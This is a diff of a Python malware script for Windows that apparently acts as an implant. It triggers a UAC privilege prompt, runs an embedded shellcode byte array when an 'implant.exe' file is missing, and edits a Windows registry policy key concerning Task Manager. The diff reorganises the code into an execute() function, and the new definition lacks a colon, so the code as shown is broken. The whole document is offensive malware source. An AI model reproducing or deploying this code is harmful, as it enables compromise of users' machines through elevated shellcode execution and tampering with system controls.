@@ -5,21 +5,8 @@ import os.path
 import _winreg
 import win32com.shell.shell as shell
 
-
-# Elevate Privilege
-ASADMIN = 'asadmin'
-
-if sys.argv[-1] != ASADMIN:
-    script = os.path.abspath(sys.argv[0])
-    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
-    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
-    sys.exit(0)
-
-PATH = "C:\\SomeDir\\example\\implant.exe" 
-
-if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
-    break
-else:
+# Main function.
+def execute()
     # Download file to path and execute (shellcode example)
     shellcode = bytearray(
 	"\xdb\xc3\xd9\x74\x24\xf4\xbe\xe8\x5a\x27\x13\x5f\x31\xc9" 
@@ -71,3 +58,20 @@ else:
 	aKey = OpenKey(aReg, r"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_SET_VALUE)
 	SetValueEx(aKey,"DisableTaskMgr",1, REG_DWORD, 0)
 	CloseKey(aKey)
+
+
+# Elevate Privilege
+ASADMIN = "asadmin"
+
+if sys.argv[-1] != ASADMIN:
+    script = os.path.abspath(sys.argv[0])
+    params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
+    shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
+    sys.exit(0)
+
+PATH = "C:\\SomeDir\\example\\implant.exe" 
+
+if os.path.isfile(PATH) and os.access(PATH, os.R_OK):
+   sys.exit(0)
+else:
+	execute()
